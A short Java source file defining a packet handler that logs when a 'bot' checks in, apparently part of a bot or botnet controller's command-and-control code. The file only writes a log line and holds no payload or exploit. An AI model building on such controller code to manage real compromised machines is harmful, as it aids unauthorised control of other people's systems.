package com.redpois0n.packets;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;

public class Packet6LogPing extends Packet {

	@Override
	public void execute(Bot bot) throws Exception {
		Main.log(bot.toString() + " reporting in");
	}

}
